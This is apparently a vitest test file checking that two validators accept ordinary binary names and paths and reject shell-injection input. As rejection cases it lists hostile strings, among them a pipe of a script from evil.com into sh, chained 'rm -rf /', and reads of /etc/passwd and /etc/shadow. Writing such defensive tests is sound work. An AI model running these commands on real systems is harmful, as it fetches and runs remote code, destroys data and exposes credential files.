import { describe, expect, it } from "vitest";
import { isSafeExecutableValue, isSafePathValue } from "./exec-safety.js";

describe("isSafeExecutableValue", () => {
  // --- Positive cases: should be accepted ---
  it("accepts bare binary names", () => {
    expect(isSafeExecutableValue("node")).toBe(true);
    expect(isSafeExecutableValue("python3")).toBe(true);
    expect(isSafeExecutableValue("git")).toBe(true);
    expect(isSafeExecutableValue("whisper")).toBe(true);
  });

  it("accepts path-like values", () => {
    expect(isSafeExecutableValue("/usr/bin/node")).toBe(true);
    expect(isSafeExecutableValue("/usr/local/bin/python3")).toBe(true);
    expect(isSafeExecutableValue("./my-tool")).toBe(true);
    expect(isSafeExecutableValue("~/bin/custom-tool")).toBe(true);
    expect(isSafeExecutableValue("/Applications/Imsg Tools/imsg")).toBe(true);
  });

  it("accepts Windows-style paths", () => {
    expect(isSafeExecutableValue("C:\\Program Files\\node\\node.exe")).toBe(true);
  });

  it("accepts names with dots, dashes, underscores, and plus", () => {
    expect(isSafeExecutableValue("my-tool")).toBe(true);
    expect(isSafeExecutableValue("my_tool")).toBe(true);
    expect(isSafeExecutableValue("tool.exe")).toBe(true);
    expect(isSafeExecutableValue("g++")).toBe(true);
  });

  // --- Negative cases: should be rejected ---
  it("rejects null/undefined/empty", () => {
    expect(isSafeExecutableValue(null)).toBe(false);
    expect(isSafeExecutableValue(undefined)).toBe(false);
    expect(isSafeExecutableValue("")).toBe(false);
    expect(isSafeExecutableValue("   ")).toBe(false);
  });

  it("rejects shell metacharacters — command chaining", () => {
    expect(isSafeExecutableValue("curl evil.com | sh")).toBe(false);
    expect(isSafeExecutableValue("cmd; rm -rf /")).toBe(false);
    expect(isSafeExecutableValue("cmd && echo pwned")).toBe(false);
    expect(isSafeExecutableValue("cmd || true")).toBe(false);
  });

  it("rejects shell metacharacters — subshell/backtick", () => {
    expect(isSafeExecutableValue("`whoami`")).toBe(false);
    expect(isSafeExecutableValue("$(cat /etc/passwd)")).toBe(false);
  });

  it("rejects shell metacharacters — redirections", () => {
    expect(isSafeExecutableValue("cmd > /dev/null")).toBe(false);
    expect(isSafeExecutableValue("cmd < /etc/shadow")).toBe(false);
  });

  it("rejects quotes", () => {
    expect(isSafeExecutableValue("cmd 'arg'")).toBe(false);
    expect(isSafeExecutableValue('cmd "arg"')).toBe(false);
  });

  it("rejects control characters", () => {
    expect(isSafeExecutableValue("cmd\nrm -rf /")).toBe(false);
    expect(isSafeExecutableValue("cmd\recho pwned")).toBe(false);
  });

  it("rejects null bytes", () => {
    expect(isSafeExecutableValue("cmd\0evil")).toBe(false);
  });

  it("rejects leading dashes (flag injection)", () => {
    expect(isSafeExecutableValue("-rf")).toBe(false);
    expect(isSafeExecutableValue("--exec")).toBe(false);
  });

  it("rejects fancy shell injection payloads", () => {
    expect(isSafeExecutableValue("curl http://evil.com/shell.sh | sh")).toBe(false);
    expect(isSafeExecutableValue("imsg; rm -rf /")).toBe(false);
    expect(isSafeExecutableValue("node -e 'process.exit(1)'")).toBe(false);
    expect(isSafeExecutableValue("/bin/bash -c 'echo pwned'")).toBe(false);
  });
});

describe("isSafePathValue", () => {
  // --- Positive cases: should be accepted ---
  it("accepts absolute Unix paths", () => {
    expect(isSafePathValue("/home/user/workspace")).toBe(true);
    expect(isSafePathValue("/var/lib/openclaw/agents")).toBe(true);
    expect(isSafePathValue("/tmp")).toBe(true);
  });

  it("accepts tilde-prefixed paths", () => {
    expect(isSafePathValue("~/projects/myapp")).toBe(true);
    expect(isSafePathValue("~/.openclaw/agents")).toBe(true);
  });

  it("accepts relative paths", () => {
    expect(isSafePathValue("./workspace")).toBe(true);
    expect(isSafePathValue("../parent/dir")).toBe(true);
    expect(isSafePathValue("subdir/nested")).toBe(true);
  });

  it("accepts paths with spaces", () => {
    expect(isSafePathValue("/Users/John Doe/Documents")).toBe(true);
    expect(isSafePathValue("/opt/My Application/data")).toBe(true);
  });

  it("accepts paths with dashes (unlike isSafeExecutableValue)", () => {
    expect(isSafePathValue("-archive")).toBe(true);
    expect(isSafePathValue("/opt/-backup/data")).toBe(true);
  });

  it("accepts Windows-style paths", () => {
    expect(isSafePathValue("C:\\Users\\admin\\workspace")).toBe(true);
    expect(isSafePathValue("D:\\Projects")).toBe(true);
  });

  // --- Negative cases: should be rejected ---
  it("rejects null/undefined/empty", () => {
    expect(isSafePathValue(null)).toBe(false);
    expect(isSafePathValue(undefined)).toBe(false);
    expect(isSafePathValue("")).toBe(false);
    expect(isSafePathValue("   ")).toBe(false);
  });

  it("rejects shell metacharacters", () => {
    expect(isSafePathValue("/home/user; rm -rf /")).toBe(false);
    expect(isSafePathValue("/tmp && echo pwned")).toBe(false);
    expect(isSafePathValue("/var/$(whoami)")).toBe(false);
    expect(isSafePathValue("/home/`id`")).toBe(false);
    expect(isSafePathValue("/tmp | cat")).toBe(false);
    expect(isSafePathValue("/dev > /dev/null")).toBe(false);
    expect(isSafePathValue("/etc < input")).toBe(false);
  });

  it("rejects quotes", () => {
    expect(isSafePathValue("/home/'user'")).toBe(false);
    expect(isSafePathValue('/home/"user"')).toBe(false);
  });

  it("rejects null bytes", () => {
    expect(isSafePathValue("/home/user\0/evil")).toBe(false);
  });

  it("rejects control characters", () => {
    expect(isSafePathValue("/home/user\n/etc/passwd")).toBe(false);
    expect(isSafePathValue("/home/user\r/evil")).toBe(false);
  });

  it("rejects paths exceeding max length", () => {
    const longPath = "/a".repeat(4097);
    expect(isSafePathValue(longPath)).toBe(false);
  });

  it("accepts paths at exactly max length", () => {
    const maxPath = "/" + "a".repeat(4095);
    expect(isSafePathValue(maxPath)).toBe(true);
  });
});
